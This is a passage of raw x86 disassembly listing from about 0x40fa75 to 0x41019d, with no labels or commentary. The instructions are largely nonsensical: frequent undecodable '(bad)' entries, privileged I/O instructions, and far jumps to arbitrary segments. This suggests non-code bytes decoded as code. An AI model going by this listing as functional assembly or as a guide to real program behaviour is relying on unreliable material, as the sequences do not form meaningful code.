  40fa75:	fdivr  QWORD PTR [edi+edx*8-0x37]
  40fa79:	repnz mov es,WORD PTR [eax-0x12]
  40fa7d:	xor    edx,DWORD PTR [ebx]
  40fa7f:	out    0xbd,al
  40fa81:	ja     0x40faa2
  40fa83:	pop    eax
  40fa84:	call   FWORD PTR [ecx-0x146abbaa]
  40fa8a:	add    al,0xa5
  40fa8c:	lahf   
  40fa8d:	int3   
  40fa8e:	imul   esp,DWORD PTR [ecx+0x1ba5be36],0xffffff85
  40fa95:	out    0x8,eax
  40fa97:	retf   0x659f
  40fa9a:	jb     0x40fa61
  40fa9c:	jge    0x40fa25
  40fa9e:	add    ebx,DWORD PTR [ebx+0x7a]
  40faa1:	nop
  40faa2:	jbe    0x40fac3
  40faa4:	or     BYTE PTR [ebp-0x3c59c62c],dh
  40faaa:	ror    ch,cl
  40faac:	xchg   BYTE PTR [eax-0x1c8e8a53],cl
  40fab2:	xchg   esp,eax
  40fab3:	pop    es
  40fab4:	test   al,0xd6
  40fab6:	xchg   esp,eax
  40fab7:	xchg   BYTE PTR [edx+0x7e4c364a],ch
  40fabd:	mov    eax,0x25cd8e85
  40fac2:	xchg   edi,eax
  40fac3:	out    dx,al
  40fac4:	push   ebp
  40fac5:	nop
  40fac6:	(bad)  
  40fac7:	out    0xb6,al
  40fac9:	in     al,dx
  40faca:	pop    esp
  40facb:	and    al,BYTE PTR [ebx]
  40facd:	xchg   DWORD PTR [ebx],edi
  40facf:	sbb    BYTE PTR [ebx-0x12],ch
  40fad2:	jecxz  0x40fb13
  40fad4:	mov    ds:0x83f10044,al
  40fad9:	aam    0xb7
  40fadb:	cmp    al,0xb2
  40fadd:	mov    ecx,0x7f29b2ca
  40fae2:	fst    DWORD PTR [ebp-0x1caba31d]
  40fae8:	ror    DWORD PTR [ebp+esi*4+0x734b2725],0xfc
  40faf0:	inc    esp
  40faf1:	jnp    0x40fb51
  40faf3:	ins    DWORD PTR es:[edi],dx
  40faf4:	jecxz  0x40fa89
  40faf6:	jp     0x40fb3a
  40faf8:	push   eax
  40faf9:	mov    esp,0x8346fe47
  40fafe:	xor    DWORD PTR [eax+0x4556b4dc],ebp
  40fb04:	push   cs
  40fb05:	fstp   TBYTE PTR [ecx-0x27]
  40fb08:	daa    
  40fb09:	sub    esp,DWORD PTR [esi-0x7a]
  40fb0c:	stos   DWORD PTR es:[edi],eax
  40fb0d:	push   esp
  40fb0e:	nop
  40fb0f:	push   ecx
  40fb10:	sub    ebp,DWORD PTR [eax+ebp*8]
  40fb13:	in     eax,0x6
  40fb15:	sti    
  40fb16:	jmp    0x4607:0x5b537501
  40fb1d:	cmp    dl,BYTE PTR [esi+0x59]
  40fb20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb21:	das    
  40fb22:	imul   BYTE PTR [esi+0xa]
  40fb25:	add    dl,BYTE PTR [ebp+ebp*2-0x49e000df]
  40fb2c:	push   cs
  40fb2d:	sbb    ebx,eax
  40fb2f:	std    
  40fb30:	cwde   
  40fb31:	or     eax,0xa3aaf90c
  40fb36:	jl     0x40fb36
  40fb38:	sbb    al,dh
  40fb3a:	retf   
  40fb3b:	dec    esp
  40fb3c:	cs xchg edi,eax
  40fb3e:	ret    0x2ba
  40fb41:	sti    
  40fb42:	in     al,dx
  40fb43:	fs pop ds
  40fb45:	ins    DWORD PTR es:[edi],dx
  40fb46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb47:	adc    eax,DWORD PTR [esi+0x234fe5e3]
  40fb4d:	imul   eax,DWORD PTR [esi-0x26882b5f],0x8d05bdd5
  40fb57:	jo     0x40faed
  40fb59:	rol    DWORD PTR [ebx-0x5ac51f9b],0xe5
  40fb60:	add    DWORD PTR [esi+0x1e47d09e],edx
  40fb66:	add    BYTE PTR [edx+0x50],ch
  40fb69:	bound  edi,QWORD PTR [edx+0x9ca0364]
  40fb6f:	jmp    0x15c3:0xcaacfca1
  40fb76:	dec    edx
  40fb77:	mov    ecx,0x2e36c56e
  40fb7c:	(bad)  
  40fb7d:	neg    DWORD PTR [ebp+edi*4+0x1b045dde]
  40fb84:	iret   
  40fb85:	pushf  
  40fb86:	add    al,0x26
  40fb88:	and    edx,esp
  40fb8a:	(bad)  
  40fb8b:	ins    BYTE PTR es:[edi],dx
  40fb8c:	xchg   ebp,eax
  40fb8d:	in     al,0x5
  40fb8f:	mov    ch,0x14
  40fb91:	xchg   ebp,eax
  40fb92:	cld    
  40fb93:	fdiv   DWORD PTR [ebx]
  40fb95:	pushf  
  40fb96:	jmp    0x40fc00
  40fb98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb99:	push   esp
  40fb9a:	sbb    al,0xce
  40fb9c:	add    al,0x69
  40fb9e:	and    DWORD PTR [ecx+0x3c6764da],esp
  40fba4:	mov    bh,ch
  40fba6:	and    dh,BYTE PTR [ebp-0x3c90bdf]
  40fbac:	jb     0x40fb51
  40fbae:	lea    esp,[edi]
  40fbb0:	push   esi
  40fbb1:	add    eax,0xcec4a399
  40fbb6:	addr16 xor al,0x51
  40fbb9:	add    BYTE PTR [esi],0x26
  40fbbc:	(bad)  
  40fbbd:	pop    esi
  40fbbe:	xchg   dl,ah
  40fbc0:	push   ds
  40fbc1:	aam    0x8b
  40fbc3:	sti    
  40fbc4:	(bad)  
  40fbc6:	inc    esi
  40fbc7:	loopne 0x40fc29
  40fbc9:	inc    ecx
  40fbca:	inc    esp
  40fbcb:	fsub   QWORD PTR [edi]
  40fbcd:	mov    bl,0x63
  40fbcf:	xchg   esi,eax
  40fbd0:	call   0x60fd16fd
  40fbd5:	dec    ebp
  40fbd6:	pop    ss
  40fbd7:	es pop ecx
  40fbd9:	adc    al,0x4d
  40fbdb:	in     al,0xf6
  40fbdd:	add    eax,0xf101491f
  40fbe2:	ret    
  40fbe3:	pop    edx
  40fbe4:	dec    esi
  40fbe5:	mov    bh,0x12
  40fbe7:	(bad)
  40fbec:	fs dec ecx
  40fbee:	fisub  DWORD PTR [ecx+0x2694737e]
  40fbf4:	pop    edx
  40fbf5:	push   eax
  40fbf6:	ja     0x40fc2f
  40fbf8:	das    
  40fbf9:	dec    esp
  40fbfa:	push   ebp
  40fbfb:	jnp    0x40fbda
  40fbfd:	retf   
  40fbfe:	jp     0x40fb8b
  40fc00:	jnp    0x40fbab
  40fc02:	ja     0x40fbf9
  40fc04:	push   edx
  40fc05:	sub    DWORD PTR ds:0x6c652ba5,ecx
  40fc0b:	push   edx
  40fc0c:	push   cs
  40fc0d:	leave  
  40fc0e:	rol    BYTE PTR ds:0x909ae13,1
  40fc14:	and    al,0x45
  40fc16:	mov    bh,0xed
  40fc18:	in     al,dx
  40fc19:	adc    eax,0xe0f6d45f
  40fc1e:	jae    0x40fc3a
  40fc20:	mov    gs,edx
  40fc22:	mov    ebp,0x9aee584e
  40fc27:	ins    BYTE PTR es:[edi],dx
  40fc28:	push   eax
  40fc29:	out    dx,al
  40fc2a:	(bad)  [edx+eiz*4+0x1c]
  40fc2e:	outs   dx,DWORD PTR ds:[esi]
  40fc2f:	dec    ebx
  40fc30:	inc    ecx
  40fc31:	test   DWORD PTR es:[esi],eax
  40fc34:	push   ds
  40fc35:	std    
  40fc36:	xchg   esp,eax
  40fc37:	fucomp st(3)
  40fc39:	cld    
  40fc3a:	stos   DWORD PTR es:[edi],eax
  40fc3b:	jb     0x40fbf4
  40fc3d:	sbb    eax,0x610396eb
  40fc42:	dec    edx
  40fc43:	(bad)  
  40fc45:	scas   eax,DWORD PTR es:[edi]
  40fc46:	cmp    esi,DWORD PTR [edx-0x20a97dc9]
  40fc4c:	jmp    0xaf696d0
  40fc51:	dec    eax
  40fc52:	test   BYTE PTR [edx+eax*2+0x11a1b63e],al
  40fc59:	xor    al,0x99
  40fc5b:	xchg   ebp,eax
  40fc5c:	rcl    BYTE PTR [esi+0x2a],0xf0
  40fc60:	jbe    0x40fc43
  40fc62:	xchg   ecx,eax
  40fc63:	mov    bh,0x77
  40fc65:	xchg   esi,eax
  40fc66:	xchg   esp,eax
  40fc67:	das    
  40fc68:	push   edx
  40fc69:	sbb    al,0xda
  40fc6b:	jns    0x40fc97
  40fc6d:	inc    ebp
  40fc6e:	in     al,0xe4
  40fc70:	fidivr DWORD PTR [bp+si]
  40fc73:	pusha  
  40fc74:	(bad)  
  40fc75:	jnp    0x40fc35
  40fc77:	dec    edi
  40fc78:	fwait
  40fc79:	jge    0x40fc17
  40fc7b:	xchg   edx,eax
  40fc7c:	xchg   esi,eax
  40fc7d:	les    ebp,FWORD PTR [ecx]
  40fc7f:	call   0xab87:0xeecc5cd6
  40fc86:	sub    al,0x6c
  40fc88:	mov    edi,0x9f6f7a19
  40fc8d:	adc    eax,0xd207e6a1
  40fc92:	icebp  
  40fc93:	lods   eax,DWORD PTR ds:[esi]
  40fc94:	out    0x8c,al
  40fc96:	inc    ebx
  40fc97:	pop    edx
  40fc98:	pop    esp
  40fc99:	mov    al,ds:0x8f0139b4
  40fc9e:	cmp    cl,0xaa
  40fca1:	cmp    eax,0x3dd9fee7
  40fca6:	push   ds
  40fca7:	add    dh,bh
  40fca9:	mov    gs,WORD PTR [ebp-0x6ef0c81b]
  40fcaf:	xor    dh,al
  40fcb1:	sahf   
  40fcb2:	aaa    
  40fcb3:	mov    ?,WORD PTR [edi-0x4d]
  40fcb6:	pop    ebx
  40fcb7:	add    dh,BYTE PTR [eax]
  40fcb9:	mov    bh,0xc5
  40fcbb:	scas   al,BYTE PTR es:[edi]
  40fcbc:	jbe    0x40fce1
  40fcbe:	mov    bh,0x16
  40fcc0:	sahf   
  40fcc1:	sbb    cl,dh
  40fcc3:	or     eax,0x96a7c9f7
  40fcc8:	cmp    al,BYTE PTR [ecx-0x41]
  40fccb:	outs   dx,DWORD PTR ds:[esi]
  40fccc:	imul   edi,DWORD PTR [ebx],0x7c4b035b
  40fcd2:	lods   eax,DWORD PTR ds:[esi]
  40fcd3:	imul   ebp
  40fcd5:	test   DWORD PTR [ecx],esi
  40fcd7:	lods   eax,DWORD PTR ds:[esi]
  40fcd8:	jg     0x40fccd
  40fcda:	rol    ebp,cl
  40fcdc:	shl    BYTE PTR [eax],1
  40fcde:	(bad)  
  40fcdf:	sub    cl,BYTE PTR [ebp+0x7e]
  40fce2:	sbb    DWORD PTR [esi],edx
  40fce4:	in     al,dx
  40fce5:	add    DWORD PTR ds:0x75230885,0xc28a9c4a
  40fcef:	sbb    DWORD PTR [eax+edi*1-0x23],ebx
  40fcf3:	push   ebp
  40fcf4:	push   edx
  40fcf5:	mov    eax,0x481cc0cb
  40fcfa:	inc    ecx
  40fcfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcfc:	push   edx
  40fcfd:	mov    DWORD PTR [ecx-0x4f8d0c6f],esp
  40fd03:	add    DWORD PTR [edx-0x7e],esi
  40fd06:	mov    dl,0x86
  40fd08:	inc    edx
  40fd09:	pusha  
  40fd0a:	shl    DWORD PTR [esi+0x5b],0x89
  40fd0e:	popf   
  40fd0f:	ins    DWORD PTR es:[edi],dx
  40fd10:	mov    edi,fs
  40fd12:	imul   DWORD PTR [ebx+ebp*8-0x1b]
  40fd16:	pop    esp
  40fd17:	adc    eax,0xa5cc5fcb
  40fd1c:	jge    0x40fca9
  40fd1e:	dec    esi
  40fd1f:	ffree  st(2)
  40fd21:	(bad)  
  40fd23:	add    eax,0x7b5ab4ad
  40fd28:	sub    DWORD PTR [eax],eax
  40fd2a:	shl    DWORD PTR [edx-0x10],cl
  40fd2d:	loop   0x40fd24
  40fd2f:	sti    
  40fd30:	mov    ds:0x330e154f,eax
  40fd35:	call   FWORD PTR [edi-0x54d24267]
  40fd3b:	add    eax,0xfcc0ea85
  40fd40:	xchg   esp,eax
  40fd41:	scas   al,BYTE PTR es:[edi]
  40fd42:	retf   0xf5a3
  40fd45:	jge    0x40fd5f
  40fd47:	dec    esi
  40fd48:	jl     0x40fcfc
  40fd4a:	rcl    DWORD PTR [ebp+esi*2-0x1f],cl
  40fd4e:	retf   0xf8f3
  40fd51:	mov    edx,0x44c7f0c7
  40fd56:	and    dl,ah
  40fd58:	sub    eax,0xc1434c6a
  40fd5d:	push   edi
  40fd5e:	cmp    BYTE PTR [edx],dl
  40fd60:	dec    eax
  40fd61:	sbb    ebx,DWORD PTR [esi]
  40fd63:	outs   dx,DWORD PTR ds:[esi]
  40fd64:	inc    edx
  40fd65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd66:	pop    eax
  40fd67:	iret   
  40fd68:	mov    bl,0xa5
  40fd6a:	shl    BYTE PTR [ecx-0x3b],0x91
  40fd6e:	cld    
  40fd6f:	into   
  40fd70:	arpl   WORD PTR [eax+0x22],ax
  40fd73:	pusha  
  40fd74:	repnz push ds
  40fd76:	mov    ebp,0x99acfd16
  40fd7b:	jl     0x40fd3a
  40fd7d:	pop    ds
  40fd7e:	in     eax,0xfe
  40fd80:	cmp    al,0xf
  40fd82:	sub    eax,ebp
  40fd84:	jp     0x40fdec
  40fd86:	push   0xfffffff1
  40fd88:	arpl   WORD PTR [edx+0x1b],bx
  40fd8b:	(bad)  [ecx-0x74e3bec4]
  40fd91:	and    DWORD PTR [edx+ecx*8],ebp
  40fd94:	mov    gs,WORD PTR [edi+0x13]
  40fd97:	add    bh,al
  40fd99:	push   esp
  40fd9a:	shl    DWORD PTR [ebx],1
  40fd9c:	mov    ah,0x59
  40fd9e:	sbb    DWORD PTR [edx+0x72],0x37c61d3e
  40fda5:	lds    eax,FWORD PTR [ecx+0x38aefc15]
  40fdab:	fimul  DWORD PTR [esi]
  40fdad:	lods   al,BYTE PTR ds:[esi]
  40fdae:	retf   0x2120
  40fdb1:	xchg   ebp,eax
  40fdb2:	dec    esi
  40fdb3:	fisubr DWORD PTR [ebp+0x61]
  40fdb6:	jb     0x40fd80
  40fdb8:	ss xchg edi,eax
  40fdba:	jo     0x40fd4d
  40fdbc:	mov    ah,0xd9
  40fdbe:	cmp    cl,dl
  40fdc0:	jl     0x40fd49
  40fdc2:	or     bl,al
  40fdc4:	dec    ebx
  40fdc5:	pop    ds
  40fdc6:	mov    ecx,DWORD PTR [ebp+0x2de5a1e0]
  40fdcc:	call   FWORD PTR fs:[ebx+0x41]
  40fdd0:	scas   al,BYTE PTR es:[edi]
  40fdd1:	shl    BYTE PTR [ecx-0x45],1
  40fdd4:	dec    eax
  40fdd5:	dec    edi
  40fdd6:	jge    0x40fdd9
  40fdd8:	outs   dx,BYTE PTR ds:[esi]
  40fdd9:	out    0xec,eax
  40fddb:	sbb    ah,BYTE PTR [esp+ecx*2]
  40fdde:	stos   BYTE PTR es:[edi],al
  40fddf:	lods   eax,DWORD PTR ds:[esi]
  40fde0:	fidiv  DWORD PTR [edx+0x2635025b]
  40fde6:	adc    DWORD PTR [ecx-0xd],esi
  40fde9:	xlat   BYTE PTR ds:[ebx]
  40fdea:	ret    
  40fdeb:	cwde   
  40fdec:	in     eax,0xb0
  40fdee:	mov    edx,0x7ef21c00
  40fdf3:	inc    ecx
  40fdf4:	push   ebp
  40fdf5:	dec    edx
  40fdf6:	mov    edx,0x31b46dae
  40fdfb:	mov    ds:0xd03064ca,eax
  40fe00:	(bad)  
  40fe01:	aas    
  40fe02:	jmp    0x6b71:0x999188a4
  40fe09:	pop    ebp
  40fe0a:	(bad)  
  40fe0b:	popa   
  40fe0c:	add    edx,DWORD PTR [ebx]
  40fe0e:	js     0x40fe6b
  40fe10:	pushf  
  40fe11:	pop    es
  40fe12:	(bad)  
  40fe13:	int3   
  40fe14:	push   ecx
  40fe15:	ror    DWORD PTR [esi+0x4b],0x33
  40fe19:	push   esp
  40fe1a:	cdq    
  40fe1b:	loop   0x40fda6
  40fe1d:	or     eax,0xaa352367
  40fe22:	mov    ah,BYTE PTR [esi]
  40fe24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe25:	sub    bh,BYTE PTR [ebx-0x4f26b6e7]
  40fe2b:	pop    ds
  40fe2c:	daa    
  40fe2d:	jns    0x40fdf1
  40fe2f:	js     0x40fe0a
  40fe31:	repz jae 0x40fe0f
  40fe34:	adc    DWORD PTR [edx-0x76],0x3a36bfe8
  40fe3b:	test   DWORD PTR [ecx-0x62],eax
  40fe3e:	push   0x29
  40fe40:	lds    eax,FWORD PTR [esi-0x3]
  40fe43:	repnz pop esp
  40fe45:	in     eax,dx
  40fe46:	aaa    
  40fe47:	daa    
  40fe48:	cmp    bh,bl
  40fe4a:	ror    DWORD PTR [esi],1
  40fe4c:	out    dx,al
  40fe4d:	adc    bh,bh
  40fe4f:	push   cs
  40fe50:	push   eax
  40fe51:	mov    BYTE PTR [eax-0x3a351b5a],0x35
  40fe58:	pop    esi
  40fe59:	mov    esi,0x2be83a29
  40fe5e:	lahf   
  40fe5f:	adc    al,0xb1
  40fe61:	pop    es
  40fe62:	fdiv   QWORD PTR [ebx+0x8f181e]
  40fe68:	mov    BYTE PTR [edi],dh
  40fe6a:	inc    esi
  40fe6b:	jns    0x40fed7
  40fe6d:	mov    ebp,0x5304b6fa
  40fe72:	fidiv  WORD PTR [edx+0xd90580f]
  40fe78:	push   edi
  40fe79:	and    ah,BYTE PTR [eax]
  40fe7b:	push   ecx
  40fe7c:	xchg   edi,eax
  40fe7d:	aam    0xf3
  40fe7f:	les    eax,FWORD PTR [edi+0x54]
  40fe82:	sub    bl,bl
  40fe84:	hlt    
  40fe85:	aas    
  40fe86:	repnz sbb al,0x7a
  40fe89:	push   ebp
  40fe8a:	and    BYTE PTR [ecx+0x8],bl
  40fe8d:	js     0x40fe35
  40fe8f:	call   FWORD PTR [ebp-0x6f]
  40fe92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe93:	dec    ebp
  40fe94:	ror    DWORD PTR [ebp+0x4f],cl
  40fe97:	pop    eax
  40fe98:	lods   eax,DWORD PTR ds:[esi]
  40fe99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe9a:	add    esp,DWORD PTR ds:0x1a4ee8f9
  40fea0:	ret    0x83e2
  40fea3:	jbe    0x40fedf
  40fea5:	imul   ebp,edx,0xdc7fed39
  40feab:	adc    al,0x6c
  40fead:	and    DWORD PTR [edx+ecx*2+0x450e54ac],0x76e12054
  40feb8:	mov    ebx,0x60ad3b3c
  40febd:	xchg   ebp,eax
  40febe:	sub    eax,0xc00bea6c
  40fec3:	push   es
  40fec4:	adc    al,0xe1
  40fec6:	push   ss
  40fec7:	sub    ecx,DWORD PTR [esi-0x3be219b3]
  40fecd:	xchg   DWORD PTR [edx+0x43],esi
  40fed0:	push   edi
  40fed1:	cli    
  40fed2:	inc    edi
  40fed3:	and    al,0xb1
  40fed5:	lds    ecx,FWORD PTR [ecx+0x1d]
  40fed8:	cwde   
  40fed9:	mov    ebp,0xe751f85c
  40fede:	ror    eax,cl
  40fee0:	cmp    edi,0xffffffbc
  40fee3:	call   0x331e3767
  40fee8:	jbe    0x40feb2
  40feea:	mov    ah,0xb5
  40feec:	lahf   
  40feed:	mov    ds:0x14f6c456,eax
  40fef2:	xchg   edi,eax
  40fef3:	pop    esi
  40fef4:	sub    BYTE PTR [ebx+esi*8+0x6b29e01e],ch
  40fefb:	and    al,0x40
  40fefd:	nop
  40fefe:	fs (bad) 
  40ff00:	iret   
  40ff01:	add    ebp,DWORD PTR [esi-0x5aa4c56b]
  40ff07:	mov    esp,0xea2c3d42
  40ff0c:	adc    al,0xdf
  40ff0e:	push   ebx
  40ff0f:	xchg   esp,eax
  40ff10:	fild   QWORD PTR [edx+eiz*4+0x24551a3b]
  40ff17:	pop    eax
  40ff18:	lock shl BYTE PTR [eax],0xf5
  40ff1c:	addr16 scas al,BYTE PTR es:[di]
  40ff1f:	lods   eax,DWORD PTR ds:[esi]
  40ff20:	sub    BYTE PTR [ebx],al
  40ff22:	cmp    BYTE PTR [eax+0x58793e1f],dl
  40ff28:	int    0xa0
  40ff2a:	push   eax
  40ff2b:	push   edx
  40ff2c:	fucompp 
  40ff2e:	adc    eax,0xae1b8496
  40ff33:	repz mov ebx,0x375b1498
  40ff39:	ror    BYTE PTR [eax],cl
  40ff3b:	(bad)  
  40ff3c:	rcl    esp,1
  40ff3e:	add    DWORD PTR [edi-0xbc732eb],esi
  40ff44:	nop
  40ff45:	or     BYTE PTR [eax-0x88e450e],0x36
  40ff4c:	bound  ebx,QWORD PTR [edi+0x5a6af76a]
  40ff52:	jmp    0x40feec
  40ff54:	retf   
  40ff55:	int3   
  40ff56:	inc    esi
  40ff57:	jne    0x40fee7
  40ff59:	mov    ds:0x950b41b6,eax
  40ff5e:	add    BYTE PTR [edx+ebx*1+0x41ca537d],dl
  40ff65:	dec    edx
  40ff66:	enter  0x10ec,0x7e
  40ff6a:	cmp    DWORD PTR gs:[ebx+ebp*8],edi
  40ff6e:	mov    ah,0xb6
  40ff70:	push   ecx
  40ff71:	fstp   st(5)
  40ff73:	rol    BYTE PTR [ebx+0xd],cl
  40ff76:	add    eax,0xc93e6fae
  40ff7b:	pop    edx
  40ff7c:	icebp  
  40ff7d:	and    DWORD PTR [edx-0x111d96ef],edx
  40ff83:	adc    esi,edi
  40ff85:	ds sbb al,0x60
  40ff88:	pop    ebp
  40ff89:	adc    dl,dl
  40ff8b:	xor    BYTE PTR [eax-0x5ab96c37],0xc
  40ff92:	(bad)  
  40ff93:	cli    
  40ff94:	inc    eax
  40ff95:	and    BYTE PTR [eax],0xad
  40ff98:	pop    edi
  40ff99:	repz mov ebx,0x55c2af55
  40ff9f:	jecxz  0x40ffd5
  40ffa1:	pop    edi
  40ffa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffa3:	push   esp
  40ffa4:	repz scas al,BYTE PTR es:[edi]
  40ffa6:	xchg   BYTE PTR [edi+0x64],dl
  40ffa9:	push   es
  40ffaa:	fistp  WORD PTR [eax-0x66]
  40ffad:	add    ecx,DWORD PTR [eax-0x10]
  40ffb0:	and    DWORD PTR [edi+edx*2],esi
  40ffb3:	int    0xa8
  40ffb5:	and    DWORD PTR [esi+0x58],esi
  40ffb8:	jp     0x410029
  40ffba:	out    0x35,eax
  40ffbc:	push   ds
  40ffbd:	mov    esi,DWORD PTR [edi]
  40ffbf:	push   edi
  40ffc0:	arpl   bx,bx
  40ffc2:	out    dx,eax
  40ffc3:	not    DWORD PTR [esi]
  40ffc5:	and    bh,dh
  40ffc7:	cmp    al,0xc6
  40ffc9:	xor    cl,BYTE PTR [eax+edx*1-0x79]
  40ffcd:	adc    eax,0x4d906fdf
  40ffd2:	loopne 0x40ff61
  40ffd4:	push   es
  40ffd5:	pop    ecx
  40ffd6:	ret    
  40ffd7:	pop    edx
  40ffd8:	jae    0x410028
  40ffda:	pushf  
  40ffdb:	pusha  
  40ffdc:	into   
  40ffdd:	pushf  
  40ffde:	retf   
  40ffdf:	jl     0x410007
  40ffe1:	scas   eax,DWORD PTR es:[edi]
  40ffe2:	(bad)  
  40ffe3:	hlt    
  40ffe4:	push   edi
  40ffe5:	jne    0x40ffde
  40ffe7:	mov    ds:0x837e6a67,al
  40ffec:	or     eax,0x71bebc38
  40fff1:	dec    esi
  40fff2:	push   edx
  40fff3:	push   0x2b6b45
  40fff8:	loop   0x40ffba
  40fffa:	lea    esi,[ebx-0x38c373e8]
  410000:	callw  0x695a
  410004:	cmp    edi,DWORD PTR [ebx]
  410006:	or     al,dl
  410008:	mov    ds:0x8f43b080,al
  41000d:	fiadd  WORD PTR [edi+0x3]
  410010:	mov    al,ds:0x1b120937
  410015:	into   
  410016:	into   
  410017:	out    0x72,eax
  410019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41001a:	shr    DWORD PTR ss:[ebx],1
  41001d:	pop    edx
  41001e:	inc    esp
  41001f:	xor    DWORD PTR [edi],0x45bb3206
  410025:	add    eax,0xc776631a
  41002a:	jo     0x41005b
  41002c:	pop    ds
  41002d:	test   al,0xa5
  41002f:	mov    ch,0xe0
  410031:	aas    
  410032:	repz dec esp
  410034:	scas   al,BYTE PTR es:[edi]
  410035:	sbb    al,0xd2
  410037:	call   DWORD PTR [ecx]
  410039:	addr16 dec ebx
  41003b:	outs   dx,BYTE PTR ds:[esi]
  41003c:	jle    0x4100af
  41003e:	aas    
  41003f:	ins    DWORD PTR es:[edi],dx
  410040:	shr    BYTE PTR [edi+0x61],1
  410043:	cmp    BYTE PTR [eax+0x3b],0x46
  410047:	(bad)  
  410048:	fsub   DWORD PTR [edi+0x256f1ad]
  41004e:	mov    ebx,DWORD PTR [ecx+0x64]
  410051:	out    0xe0,eax
  410053:	out    0x89,al
  410055:	es push ebp
  410057:	inc    edi
  410058:	gs dec eax
  41005a:	adc    BYTE PTR ds:0xde02392a,dl
  410060:	aas    
  410061:	adc    al,ch
  410063:	pop    esp
  410064:	push   es
  410065:	(bad)  
  410066:	(bad)  
  410067:	pop    eax
  410068:	dec    ebp
  410069:	mov    cl,dl
  41006b:	je     0x4100c5
  41006d:	arpl   WORD PTR [esi],si
  41006f:	jae    0x4100e3
  410071:	stos   DWORD PTR es:[edi],eax
  410072:	or     BYTE PTR [ecx],cl
  410074:	out    dx,al
  410075:	lock mov esp,0x7c0741e0
  41007b:	sbb    eax,0x1030dd29
  410080:	cwde   
  410081:	sub    DWORD PTR [eax-0x61],0xffffffc0
  410085:	ins    DWORD PTR es:[edi],dx
  410086:	push   edi
  410087:	inc    ebp
  410088:	push   esi
  410089:	addr16 adc eax,0x8d086450
  41008f:	sti    
  410090:	jle    0x410041
  410092:	cmp    ecx,DWORD PTR [eax]
  410094:	(bad)
  410097:	outs   dx,DWORD PTR ds:[esi]
  410098:	pop    edx
  410099:	outs   dx,BYTE PTR ds:[esi]
  41009a:	test   eax,0xfa03e27a
  41009f:	clc    
  4100a0:	mov    dl,0x5f
  4100a2:	lods   eax,DWORD PTR ds:[esi]
  4100a3:	les    edx,FWORD PTR ss:[esi+ecx*2]
  4100a7:	mov    dh,0x4c
  4100a9:	xor    esi,DWORD PTR [eax]
  4100ab:	pusha  
  4100ac:	test   eax,0xf57e7fd2
  4100b1:	popa   
  4100b2:	push   es
  4100b3:	sub    DWORD PTR [edi+0x33],0xffffffdf
  4100b7:	mov    ebx,0xa75ddeca
  4100bc:	push   esp
  4100bd:	std    
  4100be:	and    eax,0x2ff7a0a5
  4100c3:	jge    0x410045
  4100c5:	inc    ebp
  4100c6:	push   edi
  4100c7:	stos   BYTE PTR es:[edi],al
  4100c8:	mov    al,0x94
  4100ca:	hlt    
  4100cb:	inc    BYTE PTR [eax-0xe7c9c68]
  4100d1:	rcl    ah,cl
  4100d3:	in     eax,dx
  4100d4:	or     DWORD PTR [eax],eax
  4100d6:	mov    cl,0x14
  4100d8:	test   BYTE PTR [ecx],dh
  4100da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100db:	sub    eax,0x12084df1
  4100e0:	(bad)  
  4100e1:	or     BYTE PTR [ebx-0x4170ebeb],0x44
  4100e8:	int3   
  4100e9:	leave  
  4100ea:	inc    esi
  4100eb:	cmp    dl,al
  4100ed:	arpl   WORD PTR [ebp+0x39],bp
  4100f0:	fimul  DWORD PTR [edi+0x0]
  4100f3:	dec    esp
  4100f4:	test   eax,0x64da2f76
  4100f9:	push   edx
  4100fa:	jle    0x4100ec
  4100fc:	mov    ebx,0x9c1e158d
  410101:	fcmovne st,st(6)
  410103:	sbb    ecx,DWORD PTR [edi-0x626ce8c4]
  410109:	pop    edi
  41010a:	jne    0x41008f
  41010c:	adc    ch,BYTE PTR ds:0x9e06b460
  410112:	stc    
  410113:	or     DWORD PTR [ecx+0x40cba487],0xffffff82
  41011a:	mov    dh,0x43
  41011c:	dec    edx
  41011d:	pop    ss
  41011e:	stos   BYTE PTR es:[edi],al
  41011f:	fisttp QWORD PTR [ecx+0x5f]
  410122:	(bad)
  410125:	hlt    
  410126:	push   cs
  410127:	xchg   edi,eax
  410128:	in     al,0x36
  41012a:	xchg   esp,eax
  41012b:	and    bh,BYTE PTR [edx]
  41012d:	addr16 (bad) 
  41012f:	js     0x41017b
  410131:	sub    ah,BYTE PTR [ecx-0x7df4edb2]
  410137:	adc    eax,0xffffffcb
  41013a:	shl    DWORD PTR [eax-0x7f],1
  41013d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41013e:	ss mov edi,0xea9a753
  410144:	sbb    dh,dh
  410146:	mov    edi,edi
  410148:	mov    ch,0x1d
  41014a:	push   esp
  41014b:	xchg   esi,eax
  41014c:	ret    0xfd71
  41014f:	mov    esi,0x4a7fa40c
  410154:	ss test al,0x45
  410157:	ins    DWORD PTR es:[edi],dx
  410158:	xor    ebp,DWORD PTR [ecx+0x27]
  41015b:	outs   dx,BYTE PTR ds:[esi]
  41015c:	and    eax,0x42728167
  410161:	inc    ebx
  410162:	and    DWORD PTR [esp+edi*8-0x27759fa0],edx
  410169:	scas   al,BYTE PTR es:[edi]
  41016a:	add    al,0x85
  41016c:	push   eax
  41016d:	jbe    0x410144
  41016f:	(bad)  
  410170:	mov    ecx,0x702bd615
  410175:	fdiv   DWORD PTR [eax]
  410177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410178:	hlt    
  410179:	test   DWORD PTR [esi+ebx*1-0x7b],esp
  41017d:	call   0xb181:0x782d8a97
  410184:	out    0x2e,eax
  410186:	rcr    edi,1
  410188:	in     al,0x4f
  41018a:	mov    cs,esp
  41018c:	clc    
  41018d:	pop    edx
  41018e:	add    eax,0x44a027f5
  410193:	ja     0x4101d3
  410195:	push   ds
  410196:	(bad)  
  410197:	loop   0x4101c8
  410199:	dec    ecx
  41019a:	ret    
  41019b:	jae    0x410170
  41019d:	jnp    0x4101f7
